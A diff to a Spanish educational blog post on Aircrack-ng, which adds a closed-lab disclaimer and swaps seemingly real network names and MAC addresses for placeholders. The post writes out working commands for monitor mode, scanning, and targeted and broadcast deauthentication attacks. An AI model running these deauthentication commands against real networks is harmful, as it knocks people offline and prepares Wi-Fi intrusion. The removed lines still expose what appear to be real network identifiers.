@@ -7,6 +7,8 @@ En este post te voy a contar sobre la herramienta Aircrack-ng, al igual que de a
 
 Este post esta hecho con intencion educativa, no me hago responsable del uso que se pueda llegar a dar.
 
+(Todo este post esta echo en un entorno de pruebas cerrado, con las redes creadas para la prueba)
+
 ## Aircrack-ng
 Documentación oficial: https://www.aircrack-ng.org/doku.php
 
@@ -62,11 +64,11 @@ El modo monitor, en nuestra tarjeta de red, nos sirve para interceptar los paque
 Para poner nuestra tarjeta de red en modo monitor podemos usar cualquiera de estos dos comandos
 
 ```
-sudo airmon-ng start wlx3c52a1e258d8
+sudo airmon-ng start wlan0
 ```
 
 ```
-sudo iwconfig wlx3c52a1e258d8 mode monitor
+sudo iwconfig wlan0 mode monitor
 ```
 En caso de que haya funcionado correctamente veríamos algo parecido a esto:
 
@@ -83,7 +85,7 @@ sudo iw dev wlan0 info
 Para parar el modo monitor primero tendríamos que usar este comando
 
 ```
-sudo airmon-ng stop wlx3c52a1e258d8
+sudo airmon-ng stop wlan0
 ```
 
 Después tenemos que cerrar algunos procesos que pueden ser conflictivos, para pararlos usaremos este comando
@@ -111,7 +113,7 @@ sudo /etc/init.d/networking restart
 Para escanear los puntos de acceso disponibles en la red con Airodump (esta utilidad es de la suite de Aircrack)
 
 ```
-sudo airodump-ng wlx3c52a1e258d8
+sudo airodump-ng wlan0
 ```
 
 ![1](</Writeups/Blogs/Wifi/img/4.png>)
@@ -125,19 +127,19 @@ Con esta herramienta podemos filtrar la información, para quedarnos solo con lo
 Esta seria la manera de filtrar por el canal
 
 ```
-sudo airodump-ng -c 6 wlx3c52a1e258d8
+sudo airodump-ng -c 6 wlan0
 ```
 
 Así filtraríamos por el ESSID
 
 ```
-sudo airodump-ng --essid vodafoneBA7676 wlx3c52a1e258d8
+sudo airodump-ng --essid LAB-AP-1 wlan0
 ```
 
 Y lo mismo por el BSSID
 
 ```
-sudo airodump-ng --bssid CA:D9:D2:E8:20:49 wlx3c52a1e258d8
+sudo airodump-ng --bssid AA:BB:CC:00:11:11 wlan0
 ```
 
 Para guardar la información obtenida en la captura de paquetes de red, usaremos el parámetro -w:
@@ -186,7 +188,7 @@ Para expulsar al equipo de su red haremos un ataque de deautenticacion, podemos 
 Primero tenemos que analizar nuestra red, en busca de una posible victima
 
 ```
-sudo airodump-ng --bssid 60:8D:26:F2:E6:C4 wlx3c52a1e258d8
+sudo airodump-ng --bssid AA:BB:CC:00:22:22 wlan0
 ```
 
 Después con el anterior comando en segundo plano haremos la deautenticacion
@@ -196,7 +198,7 @@ Después con el anterior comando en segundo plano haremos la deautenticacion
 - El -c es la MAC de el equipo victima
 
 ```
-aireplay-ng -0 0 -a 60:8D:26:F2:E6:C4 -e Livebox6-E6C5 -c 22:B2:62:79:21:0F wlx3c52a1e258d8
+aireplay-ng -0 0 -a AA:BB:CC:00:22:22 -e LAB-AP-2 -c AA:BB:CC:00:33:33 wlan0
 ```
 
 ### Ataque de deautenticación global
@@ -204,13 +206,13 @@ aireplay-ng -0 0 -a 60:8D:26:F2:E6:C4 -e Livebox6-E6C5 -c 22:B2:62:79:21:0F wlx3
 Primero hacemos lo mismo que antes, y analizamos la red
 
 ```
-sudo airodump-ng -c 6 --bssid 60:8D:26:F2:E6:C4 wlx3c52a1e258d8
+sudo airodump-ng -c 6 --bssid AA:BB:CC:00:22:22 wlan0
 ```
 
 Ahora podemos hacer un ataque de deautenticacion a toda la red, para esto usaremos este comando
 
 ```
-aireplay-ng -0 0 -a 60:8D:26:F2:E6:C4 -e Livebox6-E6C5 -c FF:FF:FF:FF:FF:FF wlx3c52a1e258d8
+aireplay-ng -0 0 -a AA:BB:CC:00:22:22 -e LAB-AP-2 -c FF:FF:FF:FF:FF:FF wlan0
 ```
 
 ## Captura del handshake
